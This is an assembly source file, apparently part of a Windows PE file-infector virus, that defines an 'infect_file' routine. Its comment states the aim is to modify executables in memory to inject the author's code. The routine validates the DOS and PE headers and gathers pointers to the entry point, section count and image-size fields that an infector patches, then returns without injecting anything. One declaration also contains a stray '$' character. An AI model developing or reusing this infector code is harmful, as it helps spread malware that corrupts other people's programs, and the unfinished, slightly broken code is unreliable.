
ifndef	INFECT_FILE_ASM_
INFECT_FILE_ASM_ MACRO
ENDM

include		utils.asm

include		\masm32\include\windows.inc
;include		\masm32\include\user32.inc
;include		\masm32\include\kernel32.inc

; Parse and modify the executable mapped in memory to inject our code.
; ebx = delta offset
infect_file PROC NEAR fileptr:DWORD

LOCAL	ptr_adressofentrypoint:DWORD
LOCAL	ptr_filealignment:DWORD
LOCAL	ptr_numberofsections:DWORD$
LOCAL	ptr_sizeofcode:DWORD
LOCAL	ptr_sizeofimage:DWORD
LOCAL	ptr_sizeofoptionalheader:DWORD

	pushad

	mov		esi, fileptr				; esi -> IMAGE_DOS_HEADER
	
	cmp		WORD ptr [esi], "ZM"		;
	jne		infect_err					; Check DOS signature

	add		esi, [esi + 03ch]			; esi -> IMAGE_NT_HEADERS

	cmp     word ptr [esi], "EP"		;
	jne		infect_err					; Check PE signature

	push	esi							; esi -> IMAGE_NT_HEADERS

	add		esi, 04h					; esi -> IMAGE_FILE_HEADER

	lea		ecx, [esi + 02h]			;
	mov		ptr_numberofsections, ecx	; Got IMAGE_NT_HEADER.NumberOfSections
	lea		ecx, [esi + 010h]			 ;
	mov		ptr_sizeofoptionalheader, ecx; Got IMAGE_NT_HEADER.SizeOfOptionalHeader

	pop		esi							; esi -> IMAGE_NT_HEADERS
	push	esi
	add		esi, 018h					; esi -> IMAGE_OPTIONAL_HEADER
	
    cmp     word ptr [esi], 010bh       ; Check 32bit magic (010bh)
    jne     infect_err

	lea		ecx, [esi + 04h]			;
	mov		ptr_sizeofcode, ecx			; Got IMAGE_OPTIONAL_HEADER.SizeOfCode
	lea		ecx, [esi + 010h]			;
	mov		ptr_adressofentrypoint, ecx	; Got IMAGE_OPTIONAL_HEADER.AddressOfEntryPoint
	lea		ecx, [esi + 024h]			;
	mov		ptr_filealignment, ecx		; Got IMAGE_OPTIONAL_HEADER.FileAlignment
	lea		ecx, [esi + 038h]			;
	mov		ptr_sizeofimage, ecx		; Got IMAGE_OPTIONAL_HEADER.SizeOfImage

	pop		esi							; esi -> IMAGE_NT_HEADERS

	add		esi, SIZEOF IMAGE_NT_HEADERS; esi -> IMAGE_SECTION_HEADER[0]
	
	popad

	mov		eax, 1
	jmp		end_infect
infect_err:
	mov		eax, 0
end_infect:
	ret
infect_file ENDP

endif ; INFECT_FILE_ASM_
